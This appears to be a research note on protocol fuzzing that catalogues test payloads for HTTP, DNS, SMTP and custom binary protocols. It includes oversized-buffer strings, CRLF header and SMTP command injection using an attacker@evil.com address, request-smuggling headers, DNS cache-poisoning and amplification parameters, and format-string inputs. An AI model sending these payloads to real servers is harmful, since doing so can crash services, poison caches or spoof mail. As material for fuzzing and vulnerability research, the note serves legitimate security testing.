# Protocol Vulnerabilities - Research

## HTTP Protocol Vulnerabilities

### 1. Buffer Overflow

**Description:** Sending data larger than buffer can handle

**Target Points:**
- HTTP method
- URI path
- Header names/values
- POST body

**Test Cases:**
```python
# Long HTTP method
payload = "A" * 10000 + " / HTTP/1.1\r\n\r\n"

# Long URI
payload = "GET /" + "A" * 100000 + " HTTP/1.1\r\nHost: target\r\n\r\n"

# Long header value
payload = "GET / HTTP/1.1\r\nX-Custom: " + "B" * 50000 + "\r\n\r\n"
```

### 2. Header Injection

**Description:** Inject CRLF to add malicious headers

**Attack:**
```python
# CRLF injection
payload = "GET / HTTP/1.1\r\nHost: target\r\nX-Injected: value\r\nSet-Cookie: admin=true\r\n\r\n"

# Header smuggling
payload = "GET / HTTP/1.1\r\nContent-Length: 45\r\nTransfer-Encoding: chunked\r\n\r\n"
```

### 3. HTTP/2 Specific

**Stream Multiplexing Bugs:**
- Rapid stream creation/destruction
- Invalid stream IDs
- Flow control violations

**HPACK Compression:**
```python
# Oversized dynamic table
# Malformed huffman encoding
# Invalid index references
```

---

## DNS Protocol Vulnerabilities

### 1. Cache Poisoning

**Attack Vector:** Forge DNS responses

**Test Cases:**
```python
# Query ID manipulation
query_id = [0x0000, 0xFFFF, 0x8000]  # Test boundaries

# Response flag manipulation
flags = [0x8180, 0x8580, 0x8400]  # Various response codes

# Transaction ID prediction
# Send multiple forged responses
```

### 2. DNS Amplification

**Exploitation:** Small query → large response

**Test:**
```python
# Request ANY record (deprecated but still exists)
query_type = 0xFF  # ANY

# Request large TXT records
# Request DNSSEC records (RRSIG, DNSKEY)
```

### 3. Name Compression Attacks

**Compression Pointer Loops:**
```python
# Create circular reference
# Offset points to itself
compression_pointer = b'\xC0\x0C'  # Points to offset 12

# Nested compression
# Multiple levels of indirection
```

### 4. Query Name Fuzzing

**Test Cases:**
```
# Maximum label length (63 bytes)
label = "A" * 63

# Maximum name length (255 bytes)
name = ".".join(["A" * 63] * 3)

# Invalid characters
name = "test\x00domain.com"

# Empty labels
name = "test..domain.com"
```

---

## SMTP Protocol Vulnerabilities

### 1. Command Injection

**CRLF Injection:**
```python
# Inject additional SMTP commands
email = "victim@test.com\r\nMAIL FROM:<attacker@evil.com>\r\n"

# Header injection via email address
email = "test@domain.com\r\nBcc: secret@target.com\r\n"
```

**Test Cases:**
```python
# HELO/EHLO overflow
payload = "HELO " + "A" * 10000 + "\r\n"

# MAIL FROM overflow  
payload = "MAIL FROM: <" + "A" * 5000 + "@domain.com>\r\n"

# RCPT TO command stacking
payload = "RCPT TO: <test@domain.com>\r\nDATA\r\n"

# HELP command overflow
payload = "HELP " + "X" * 10000 + "\r\n"
```

### 2. Buffer Overflow

**Common Targets:**
```python
# Sender address
sender = "<" + "A" * 10000 + "@evil.com>"

# Recipient address
recipient = "<" + "B" * 10000 + "@target.com>"

# Subject header
subject = "Subject: " + "X" * 100000

# Message body
body = "Y" * 1000000
```

### 3. Authentication Bypass

**Test Cases:**
```python
# Auth command variations
"AUTH PLAIN\r\n"
"AUTH LOGIN\r\n"
"AUTH " + "Z" * 1000 + "\r\n"

# Base64 overflow in credentials
credentials = base64.b64encode(b"A" * 10000)
```

---

## Binary Protocol Fuzzing

### Grammar-Based Approach

**Protocol Grammar Example:**
```json
{
  "name": "CustomProtocol",
  "fields": [
    {
      "name": "magic",
      "type": "uint32",
      "value": "0xDEADBEEF"
    },
    {
      "name": "version",
      "type": "uint8",
      "valid_values": [1, 2, 3]
    },
    {
      "name": "length",
      "type": "uint16",
      "computed": "len(payload)"
    },
    {
      "name": "command",
      "type": "uint8"
    },
    {
      "name": "payload",
      "type": "bytes",
      "max_length": 1024
    },
    {
      "name": "checksum",
      "type": "uint32",
      "computed": "crc32(packet)"
    }
  ]
}
```

### Structure-Aware Mutations

**1. Length Field Mismatch:**
```python
# Underflow: length < actual data
packet['length'] = 10
packet['payload'] = b"A" * 100

# Overflow: length > actual data  
packet['length'] = 1000
packet['payload'] = b"A" * 10

# Integer overflow
packet['length'] = 0xFFFF
```

**2. Invalid Magic/Version:**
```python
# Wrong magic number
packet['magic'] = 0xCAFEBABE  # Not 0xDEADBEEF

# Invalid version
packet['version'] = 255  # Not in [1, 2, 3]
```

**3. Checksum Violations:**
```python
# Incorrect checksum
packet['checksum'] = 0x00000000  # Wrong value

# Modified payload without checksum update
packet['payload'] = mutate(packet['payload'])
# Don't recalculate checksum
```

**4. Field Boundary Tests:**
```python
# Zero-length payload
packet['payload'] = b""

# Maximum-length payload
packet['payload'] = b"A" * 0xFFFF

# Null bytes
packet['payload'] = b"\x00" * 100
```

---

## Vulnerability Patterns

### Integer Overflow/Underflow

**Test Values:**
```python
INT_MAX_VALUES = {
    'uint8': 0xFF,
    'uint16': 0xFFFF,
    'uint32': 0xFFFFFFFF,
    'uint64': 0xFFFFFFFFFFFFFFFF,
    
    'int8': 0x7F / -0x80,
    'int16': 0x7FFF / -0x8000,
    'int32': 0x7FFFFFFF / -0x80000000,
}

# Test boundaries
test_values = [0, 1, max_value - 1, max_value, max_value + 1]
```

### Off-By-One Errors

**Loop Boundary Tests:**
```python
# Array access
for i in range(len(array) + 1):  # Intentional overflow
    data.append(i)

# String termination
string = "A" * (buffer_size - 1)  # No null terminator
```

### Format String Vulnerabilities

**Test Patterns:**
```python
format_strings = [
    "%s%s%s%s%s",
    "%x%x%x%x",
    "%n%n%n%n",
    "%.1000d",
    "%10000s"
]
```

---

## Fuzzing Corpus

### Seed Generation

**HTTP Seeds:**
```
GET / HTTP/1.1\r\nHost: test\r\n\r\n
POST / HTTP/1.0\r\nContent-Length: 4\r\n\r\ntest
PUT /upload HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n
```

**DNS Seeds:**
```python
# A record query
query = DNS(id=0x1234, qd=DNSQR(qname="example.com", qtype=1))

# MX record query
query = DNS(id=0x5678, qd=DNSQR(qname="mail.com", qtype=15))
```

**SMTP Seeds:**
```
HELO localhost\r\n
MAIL FROM:<test@example.com>\r\n
RCPT TO:<victim@target.com>\r\n
DATA\r\nSubject: Test\r\n\r\nBody\r\n.\r\n
QUIT\r\n
```

---

Status: Protocol vulnerability research complete
